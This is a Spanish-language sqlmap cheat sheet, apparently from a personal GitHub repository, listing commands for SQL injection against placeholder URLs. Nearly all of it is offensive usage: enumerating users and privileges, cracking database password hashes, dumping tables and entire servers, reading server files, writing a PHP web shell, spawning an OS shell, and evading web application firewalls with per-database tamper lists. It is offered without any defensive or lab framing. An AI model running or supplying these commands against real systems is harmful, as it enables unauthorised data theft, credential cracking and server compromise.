# SQLMap Cheat Sheet

#### Uso simple
```
sqlmap -u "<URL>"
```

#### Conocer el usuario actual
```
sqlmap -u "<URL>" --current-user
```

#### Conocer la Base de Datos actual
```
sqlmap -u "<URL>" --current-db
```

#### Conocer la versión de la base de datos
```
sqlmap -u "<URL>" --banner
```

#### Conocer si el usuario actual tiene derechos DBA (administrador)
```
sqlmap -u "<URL>" --is-dba
```

#### Conocer la arquitectura de la base de datos
```
sqlmap -u "<URL>" --schema
```

#### Buscar la palabra 'user' en todas las bases de datos donde contengan como nombre en alguna de sus tablas
```
sqlmap -u "<URL>" --search -T user
```

#### Buscar la palabra 'pass' en todas las bases de datos donde contengan como nombre en alguna de sus columnas
```
sqlmap -u "<URL>" --search -C pass
```

#### Especificar el Sistema Gestor de Base de Datos
```
sqlmap -u "<URL>" --dbms=<NAME-DBMS>
```

#### Listar los usuarios de la BD del sitio
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --users
```

#### Mostrar los privilegios del usuario de la BD
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --current-user --privileges
```

#### Mostrar los errores del DBMS para poder arreglarlos
```
sqlmap -u "<URL>" --parse-errors
```

#### Cracking a las contraseñas de las credenciales especificas de las bases de datos (credenciales de conexión)
```
sqlmap -u "<URL>" --passwords --batch
```

#### Listar las Bases de Datos del sitio
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --dbs
```

#### Listar las tablas de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> --tables
```

#### Listar las columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --columns
```

#### Ver contenido de ciertas Columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> -C <COLUMN1,COLUMN2> --dump
```

#### Ver contenido de solamente de la segunda y tercera fila de una Tabla
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --start=2 --stop=3 --dump
```

#### Ver todo el contenido de una Tabla de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --dump
```

#### Ver el contenido de una Base de Datos en donde un campo llamado 'name' y solamente muestre datos donde inician con la letra 'f'
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" -D <TARGET-DB> -T <TARGET-TABLE> --dump --where="name LIKE 'f%'"
```

#### Dumpear todas las bases de datos que existan en el servidor excluyendo las bases de datos del sistema.
```
sqlmap -u "<URL>" --no-cast --dump-all --exclude-sysdbs
```

#### Dumpear una Base de datos, usando el ataque de UNION y diciendo cuantas columnas se muestran
```
sqlmap -u "<URL>" --union-cols=5 --no-cast --dump
```

#### Dumpear una Base de datos y guardar el resultado en HTML
```
sqlmap -u "<URL>" --no-cast --dump --dump-format=HTML
```

#### Dumpear una Base de datos y guardar el resultado en SQLITE
```
sqlmap -u "<URL>" --no-cast --dump --dump-format=SQLITE
```

#### Brute force a tablas comunes
```
sqlmap -r request.txt --dbms=mssql --common-tables -D <TARGET-DB>
```

#### Obtener un Shell de OS interactivo
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --os-shell
```

#### Listar BD, usando un parámetro de 'User-Agent' con el método GET
```
sqlmap -u '<URL>' -p User-Agent --method=GET --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --dbs
```

#### Listar BD usando el método POST
```
sqlmap -u '<URL>' -p User-Agent --method=POST --data 'db=mysql&name=taco&sort=id&order=asc' -p 'name,sort,order' --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --dbs
```

#### Colocar un parámetro y usar la técnica de UNION
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U
sqlmap -u "http://site.com/index.php?search=n" -p search --technique=U
```

#### Colocar un parámetro, usar la técnica de UNION, usando un verbose nivel 3 e ignorando los resultados almacenados del query
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U --banner -v3 --fresh-queries
```

#### Colocar un parámetro, usar la técnica de UNION y enumerar los usuarios de la BD
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U --users
```

#### Usar en formulario de Login, para enviar datos en POST y usando la técnica BLIND
```
sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --banner
```

#### Usar en formulario de Login, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
```
sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --dbs
```

#### Enviar las peticiones a nuestro propio proxy
```
sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --proxy=http://localhost:8080 --dbs
```

#### Enviar diferentes Token CSRF en cada petición
```
sqlmap -u "<URL>" -p <PARAMETER> --level=3 --risk=2 --no-cast -A "NONE" --csrf-url='<URL-REQUEST-POST>' --csrf-token="<NAME-TOKEN-CSRF>" --dbs
```

#### Enviar diferentes valores a una variable en cada petición que nos hayamos dado cuenta que utiliza el sitio web
```
sqlmap -u "<URL>" -p <PARAMETER> --randomize=<NAME-PARAMETER> --batch
```

#### Leer un archivo desde un WebServer
```
sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --file-read=/xampp/htdocs/index.php --batch
```

#### Cargar una shell en el servidor
```
sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
```

#### Ignorar cualquier sesión previa (si se trata del mismo sitio) para que realice otro escaneo
```
sqlmap -u "<URL>" --cookie="<COOKIE-VALUE>" --dbs --flush-session
```

#### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
```
sqlmap -r "<PATH_FILE>" --data='user=a&pass=a' -p user --technique=B --dbs

sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --cookie="name:value" --no-cast --dbs

sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=2 --level=3 --tamper=space2comment,randomcase,between --no-cast --dbs

sqlmap -u "<URL>" -p <PARAMETER> --cookie="name:value" --threads=2 --no-cast -A "NONE" --proxy=http://localhost:8080 --tamper=space2comment,randomcase,between,charencode --not-string='A database error has been detected and fowarded to system admin.' --level=3 --risk=2 --dbms=mysql -v 3 --dbs
```

## Tampers

#### MSSQL
```
--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

#### MySQL
```
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

#### PostgreSQL
```
--tamper=xforwardedfor,space2comment,space2plus,space2randomblank,between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere
```

#### SQLite
```
--tamper=space2plus,unionalltounion.unmagicquotes,xforwardedfor,ifnull2ifisnull,randomcase,securesphere,space2comment,space2dashmmultiplespaces,nonrecursivereplacement 
```

## Techniques

- ``` B ```: Boolean-based blind
- ``` E ```: Error-based
- ``` U ```: Union query-based
- ``` S ```: Stacked queries
- ``` T ```: Time-based blind
- ``` Q ```: Inline queries

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)